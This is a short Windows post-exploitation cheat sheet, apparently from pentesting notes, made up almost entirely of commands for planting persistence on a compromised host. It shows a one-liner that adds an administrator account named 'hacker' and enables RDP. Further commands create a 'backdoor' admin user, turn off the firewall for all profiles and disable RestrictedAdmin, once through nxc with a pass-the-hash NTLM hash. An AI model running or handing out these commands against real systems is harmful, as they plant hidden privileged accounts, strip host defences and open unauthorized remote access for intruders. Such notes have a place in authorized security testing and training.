# 🚪 Backdoor & RDP Access

One liner to add user, make them admin and enable rdp:

```
net user hacker Hacker123456@ /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
```

If we get _nt authority\system_ or _administrator_ access we can create a backdoor as follows: Create user and add to administrator group

```cmd
net user /add backdoor Password123
```

```cmd
net localgroup administrators /add backdoor
```

Enable RDP:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f 
```

Disable Firewall:

```
netsh advfirewall set allprofiles state off
```

If we get account restrictions:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

With nxc:

```
nxc smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
